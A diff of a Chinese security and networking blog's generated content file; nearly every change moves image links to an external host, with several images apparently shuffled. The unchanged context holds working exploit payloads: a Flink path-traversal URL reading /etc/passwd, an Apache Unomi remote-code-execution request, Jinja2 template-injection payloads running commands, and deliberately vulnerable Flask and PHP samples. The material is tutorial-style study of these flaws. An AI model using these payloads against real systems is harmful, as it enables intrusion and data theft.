@@ -11,39 +11,39 @@
 <li>TCP 和 UDP 协议的作用范围（提供进程之间的逻辑通信)</li>
 </ul>
 <figure class="image-box">
-                <img src="/img/tcp/1591332708474.png" alt="1591332708474" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591332708474.png" alt="1591332708474" title class>
                 <p>1591332708474</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/tcp/1596374648644.png" alt="1596374648644" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596380836503.png" alt="1596374648644" title class>
                 <p>1596374648644</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/tcp/1596366771908.png" alt="1596366771908" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596366771908.png" alt="1596366771908" title class>
                 <p>1596366771908</p>
             </figure>
 
 <p><strong>三次握手</strong></p>
 <figure class="image-box">
-                <img src="/img/tcp/1596380836503.png" alt="1596380836503" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596374648644.png" alt="1596380836503" title class>
                 <p>1596380836503</p>
             </figure>
 
 <p><strong>四次挥手</strong></p>
 <figure class="image-box">
-                <img src="/img/tcp/1596380853796.png" alt="1596380853796" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596380853796.png" alt="1596380853796" title class>
                 <p>1596380853796</p>
             </figure>
 
 <h2 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h2><figure class="image-box">
-                <img src="/img/tcp/1590765220856.png" alt="1590765220856" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596380869826.png" alt="1590765220856" title class>
                 <p>1590765220856</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/tcp/1591365771480.png" alt="1591365771480" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1590765220856.png" alt="1591365771480" title class>
                 <p>1591365771480</p>
             </figure>
 
@@ -104,17 +104,17 @@
 </tr>
 </tbody></table>
 <h2 id="TCP的流量控制过程"><a href="#TCP的流量控制过程" class="headerlink" title="TCP的流量控制过程"></a>TCP的流量控制过程</h2><figure class="image-box">
-                <img src="/img/tcp/1591366377444.png" alt="1591366377444" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596380879642.png" alt="1591366377444" title class>
                 <p>1591366377444</p>
             </figure>
 
 <h2 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h2><figure class="image-box">
-                <img src="/img/tcp/1596380869826.png" alt="1596380869826" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591366377444.png" alt="1596380869826" title class>
                 <p>1596380869826</p>
             </figure>
 
 <h2 id="端口多路复用"><a href="#端口多路复用" class="headerlink" title="端口多路复用"></a>端口多路复用</h2><figure class="image-box">
-                <img src="/img/tcp/1596380879642.png" alt="1596380879642" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591365771480.png" alt="1596380879642" title class>
                 <p>1596380879642</p>
             </figure>]]></content>
       
@@ -144,17 +144,17 @@
 </li>
 </ul>
 <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="image-box">
-                <img src="/img/dhcp/1596339941167.png" alt="1596339941167" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595421350607.png" alt="1596339941167" title class>
                 <p>1596339941167</p>
             </figure>
 
 <h2 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h2><figure class="image-box">
-                <img src="/img/dhcp/1595421350607.png" alt="1595421350607" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595422505596.png" alt="1595421350607" title class>
                 <p>1595421350607</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/dhcp/1595422505596.png" alt="1595422505596" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596339941167.png" alt="1595422505596" title class>
                 <p>1595422505596</p>
             </figure>
 
@@ -173,7 +173,7 @@
 <p>（14）引导文件名：是指客户端网络引导的开机程序名称，通常设计为稍后以TFTP传送引导文件内容，占128字节。可选字段，以0x00结尾。</p>
 <p>（15）选项：提供更多的设定信息，如：子网掩码、路由器、DNS等等，可携带多个选项。每一选项的格式都是“类别-长度-值”即TLV（Tag-Len-Value）格式，完全兼容BOOTP并扩充了更多选项。</p>
 <figure class="image-box">
-                <img src="/img/dhcp/1595422712845.png" alt="1595422712845" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595422712845.png" alt="1595422712845" title class>
                 <p>1595422712845</p>
             </figure>
 
@@ -199,23 +199,23 @@
       <url>/2021/02/25/DNS/</url>
       <content type="html"><![CDATA[<h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>DNS（域名系统）是一种能够完成从名称到地址或从地址到名称的映射。系统域名解析的方式有两种，一种称为递归查询，另一种称为迭代查询</strong></p>
 <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="image-box">
-                <img src="/img/dns/1595384474208.png" alt="1595384474208" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595384474208.png" alt="1595384474208" title class>
                 <p>1595384474208</p>
             </figure>
 
 <h2 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h2><figure class="image-box">
-                <img src="/img/dns/1595384513677.png" alt="1595384513677" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595384513677.png" alt="1595384513677" title class>
                 <p>1595384513677</p>
             </figure>
 
 
 <figure class="image-box">
-                <img src="/img/dns/1595418285524.png" alt="1595418285524" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595418285524.png" alt="1595418285524" title class>
                 <p>1595418285524</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/dns/1595384639006.png" alt="1595384639006" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595384639006.png" alt="1595384639006" title class>
                 <p>1595384639006</p>
             </figure>
 
@@ -236,7 +236,7 @@
 </li>
 </ul>
 <figure class="image-box">
-                <img src="/img/dns/1595420041106.png" alt="1595420041106" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595420041106.png" alt="1595420041106" title class>
                 <p>1595420041106</p>
             </figure>
 
@@ -267,7 +267,7 @@
 <li><strong>数据连接</strong>根据通信的需要随时建立和释放，用于数据的传输。</li>
 </ul>
 <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="image-box">
-                <img src="/img/ftp/1595432256504.png" alt="1595432256504" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595432256504.png" alt="1595432256504" title class>
                 <p>1595432256504</p>
             </figure>
 
@@ -284,17 +284,17 @@
 </ul>
 <p>服务器（172.16.3.240）响应客户端PASV模式连接请求，被动等待客户端连接到服务器的219x256+164端口 </p>
 <h2 id="数据连接"><a href="#数据连接" class="headerlink" title="数据连接"></a>数据连接</h2><figure class="image-box">
-                <img src="/img/ftp/1595434276734.png" alt="1595434276734" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595434276734.png" alt="1595434276734" title class>
                 <p>1595434276734</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/ftp/1595434290076.png" alt="1595434290076" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595434290076.png" alt="1595434290076" title class>
                 <p>1595434290076</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/ftp/1595434293995.png" alt="1595434293995" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595434293995.png" alt="1595434293995" title class>
                 <p>1595434293995</p>
             </figure>
 
@@ -341,34 +341,34 @@
 </ul>
 </li>
 </ul>
-<p><img src="/img/http/1596341322106.png" alt="1596341322106"></p>
+<p><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596341322106.png" alt="1596341322106"></p>
 <h2 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h2><figure class="image-box">
-                <img src="/img/http/1596341575443.png" alt="1596341575443" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591683279197.png" alt="1596341575443" title class>
                 <p>1596341575443</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/http/1591683083552.png" alt="1591683083552" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591683083552.png" alt="1591683083552" title class>
                 <p>1591683083552</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/http/1591683279197.png" alt="1591683279197" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596341575443.png" alt="1591683279197" title class>
                 <p>1591683279197</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/http/1591685059995.png" alt="1591685059995" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591683307629.png" alt="1591685059995" title class>
                 <p>1591685059995</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/http/1591683307629.png" alt="1591683307629" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591685059995.png" alt="1591683307629" title class>
                 <p>1591683307629</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/http/1591685728692.png" alt="1591685728692" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591685728692.png" alt="1591685728692" title class>
                 <p>1591685728692</p>
             </figure>
 
@@ -557,24 +557,24 @@
 </ul>
 <h3 id="数据包搜索"><a href="#数据包搜索" class="headerlink" title="数据包搜索"></a>数据包搜索</h3><p>按<code>Ctrl+F</code>调出搜索框进行搜索</p>
 <figure class="image-box">
-                <img src="/img/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20210202131541280.png" alt="image-20210202131541280" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210202173315749.png" alt="image-20210202131541280" title class>
                 <p>image-20210202131541280</p>
             </figure>
 
 <h3 id="数据包还原"><a href="#数据包还原" class="headerlink" title="数据包还原"></a>数据包还原</h3><p>选中准备还原数据包，右键选择追踪流，选择对应的流</p>
 <figure class="image-box">
-                <img src="/img/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20210202173315749.png" alt="image-20210202173315749" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210202131541280.png" alt="image-20210202173315749" title class>
                 <p>image-20210202173315749</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20210202173401106.png" alt="image-20210202173401106" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210202173401106.png" alt="image-20210202173401106" title class>
                 <p>image-20210202173401106</p>
             </figure>
 
 <h3 id="数据包提取"><a href="#数据包提取" class="headerlink" title="数据包提取"></a>数据包提取</h3><p>在分组详细中选中右键导出字节流分组保存即可</p>
 <figure class="image-box">
-                <img src="/img/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20210202195432801.png" alt="image-20210202195432801" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210202195432801.png" alt="image-20210202195432801" title class>
                 <p>image-20210202195432801</p>
             </figure>
 
@@ -613,7 +613,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <img src="/img/CVE-2020-17519/image-20210206124042133.png" alt="image-20210206124042133" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210206124042133.png" alt="image-20210206124042133" title class>
                 <p>image-20210206124042133</p>
             </figure>
 
@@ -650,7 +650,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd unomi</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 
 <h3 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h3><figure class="image-box">
-                <img src="/img/CVE-2020-13942/image-20210204140318166.png" alt="image-20210204140318166" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210204140318166.png" alt="image-20210204140318166" title class>
                 <p>image-20210204140318166</p>
             </figure>
 
@@ -661,7 +661,7 @@
 
 <p>重启即可。</p>
 <figure class="image-box">
-                <img src="/img/CVE-2020-13942/image-20210204142554215.png" alt="image-20210204142554215" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210204151614924.png" alt="image-20210204142554215" title class>
                 <p>image-20210204142554215</p>
             </figure>
 
@@ -669,12 +669,12 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /context.json HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">47.107</span><span class="number">.132</span><span class="number">.6</span>:<span class="number">8181</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64; rv:<span class="number">52.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">52.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,en-US;q=<span class="number">0.5</span>,en;q=<span class="number">0.3</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: <span class="number">1</span></span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: <span class="number">493</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"filters"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"id"</span>: <span class="string">"sample"</span>,</span><br><span class="line">            <span class="string">"filters"</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">"condition"</span>: &#123;</span><br><span class="line">                         <span class="string">"parameterValues"</span>: &#123;</span><br><span class="line">                            <span class="string">""</span>: <span class="string">"script::Runtime r = Runtime.getRuntime(); r.exec(\"touch /tmp/rec\");"</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="string">"type"</span>: <span class="string">"profilePropertyCondition"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"sessionId"</span>: <span class="string">"sample"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <img src="/img/CVE-2020-13942/image-20210204151527235.png" alt="image-20210204151527235" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210204151527235.png" alt="image-20210204151527235" title class>
                 <p>image-20210204151527235</p>
             </figure>
 
 <h3 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h3><figure class="image-box">
-                <img src="/img/CVE-2020-13942/image-20210204151614924.png" alt="image-20210204151614924" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210204142554215.png" alt="image-20210204151614924" title class>
                 <p>image-20210204151614924</p>
             </figure>
 
@@ -735,7 +735,7 @@
 
 <p>我们访问网站，并给name传值<code>49</code>，看到返回结果是49，这里就存在了SSTI</p>
 <figure class="image-box">
-                <img src="/img/ssti/image-20210127132753924.png" alt="image-20210127132753924" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127132753924.png" alt="image-20210127132753924" title class>
                 <p>image-20210127132753924</p>
             </figure>
 
@@ -753,7 +753,7 @@
 
 <p>我们使用构造的语句可以查看到<code>whoami</code>命令执行的结果</p>
 <figure class="image-box">
-                <img src="/img/ssti/image-20210127172339276.png" alt="image-20210127172339276" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127172339276.png" alt="image-20210127172339276" title class>
                 <p>image-20210127172339276</p>
             </figure>
 
@@ -786,34 +786,34 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.args.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.args.x1][request.args.x2][request.args.x3]()[<span class="number">75</span>][request.args.x4][request.args.x5][request.args.x6][request.args.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__init__&amp;x5=__globals__&amp;x6=__builtins__&amp;x7=__import__</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <img src="/img/ssti/image-20210130001455460.png" alt="image-20210130001455460" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130001424350.png" alt="image-20210130001455460" title class>
                 <p>image-20210130001455460</p>
             </figure>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.values.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.values.x1][request.values.x2][request.values.x3]()[<span class="number">75</span>][request.values.x4][request.values.x5][request.values.x6][request.values.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__init__&amp;x5=__globals__&amp;x6=__builtins__&amp;x7=__import__</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <img src="/img/ssti/image-20210130001424350.png" alt="image-20210130001424350" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130001455460.png" alt="image-20210130001424350" title class>
                 <p>image-20210130001424350</p>
             </figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.cookies.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.cookies.x1][request.cookies.x2][request.cookies.x3]()[<span class="number">75</span>][request.cookies.x4][request.cookies.x5][request.cookies.x6][request.cookies.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <img src="/img/ssti/image-20210130000229618.png" alt="image-20210130000229618" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127174548390.png" alt="image-20210130000229618" title class>
                 <p>image-20210130000229618</p>
             </figure>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.headers.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.headers.x1][request.headers.x2][request.headers.x3]()[<span class="number">75</span>][request.headers.x4][request.headers.x5][request.headers.x6][request.headers.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <img src="/img/ssti/image-20210129235820486.png" alt="image-20210129235820486" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130000229618.png" alt="image-20210129235820486" title class>
                 <p>image-20210129235820486</p>
             </figure>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.form.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.form.x1][request.form.x2][request.form.x3]()[<span class="number">75</span>][request.form.x4][request.form.x5][request.form.x6][request.form.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <img src="/img/ssti/image-20210130002010844.png" alt="image-20210130002010844" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130002010844.png" alt="image-20210130002010844" title class>
                 <p>image-20210130002010844</p>
             </figure>
 
@@ -846,7 +846,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        t = Template(<span class="string">"Hello：&#123;&#123;n&#125;&#125;"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = Template(<span class="string">"Hello,What's your name"</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render(n=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <img src="/img/ssti/image-20210127174548390.png" alt="image-20210127174548390" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210129235820486.png" alt="image-20210127174548390" title class>
                 <p>image-20210127174548390</p>
             </figure>
 
@@ -897,7 +897,7 @@
 <p>首先进行抓包</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/暴力破解/1599814622594.png" alt="1599814622594" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1599814622594.png" alt="1599814622594" title class>
                 <p>1599814622594</p>
             </figure>
 
@@ -905,7 +905,7 @@
 <p>将抓到的包发到 Intruder 模块</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/暴力破解/1599814643215.png" alt="1599814643215" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1599814643215.png" alt="1599814643215" title class>
                 <p>1599814643215</p>
             </figure>
 
@@ -913,12 +913,12 @@
 <p>先清除标记，然后自己标记账号和密码</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/暴力破解/1599814670366.png" alt="1599814670366" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1599814784181.png" alt="1599814670366" title class>
                 <p>1599814670366</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/暴力破解/1599815003089.png" alt="1599815003089" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1599814670366.png" alt="1599815003089" title class>
                 <p>1599815003089</p>
             </figure>
 
@@ -926,7 +926,7 @@
 <p>设置对应的字典</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/暴力破解/1599814784181.png" alt="1599814784181" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1599815003089.png" alt="1599814784181" title class>
                 <p>1599814784181</p>
             </figure>
 
@@ -934,7 +934,7 @@
 <p>开始破解，长度和其他不同就是正确的</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/暴力破解/1599814916130.png" alt="1599814916130" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1599814916130.png" alt="1599814916130" title class>
                 <p>1599814916130</p>
             </figure>
 
@@ -1011,13 +1011,13 @@
 
 <p>直接访问<code>ip.php</code>发现是我们自己的P地址</p>
 <figure class="image-box">
-                <img src="/img/ssrf/1598259501707.png" alt="1598259501707" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598259501707.png" alt="1598259501707" title class>
                 <p>1598259501707</p>
             </figure>
 
 <p>利用SSRF漏洞访问<code>ip.php</code>发现是服务器的地址</p>
 <figure class="image-box">
-                <img src="/img/ssrf/1598259579496.png" alt="1598259579496" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598259579496.png" alt="1598259579496" title class>
                 <p>1598259579496</p>
             </figure>
 
@@ -1142,38 +1142,38 @@
 <h2 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> shell_exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <img src="/img/命令执行/1598801111498.png" alt="1598801111498" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598801111498.png" alt="1598801111498" title class>
                 <p>1598801111498</p>
             </figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#2.php	动态函数调用</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"a()函数.."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"b()函数.."</span>;</span><br><span class="line">&#125;</span><br><span class="line">$fun=$_REQUEST[<span class="string">'fun'</span>];</span><br><span class="line"><span class="keyword">echo</span> $fun();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <img src="/img/命令执行/1598801174266.png" alt="1598801174266" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598801174266.png" alt="1598801174266" title class>
                 <p>1598801174266</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/命令执行/1598801216337.png" alt="1598801216337" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598801425250.png" alt="1598801216337" title class>
                 <p>1598801216337</p>
             </figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#3.php 动态函数调用（传递参数）</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $fun = $_GET[<span class="string">'fun'</span>];</span><br><span class="line">    $par = $_GET[<span class="string">'par'</span>];</span><br><span class="line">    $fun($par);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
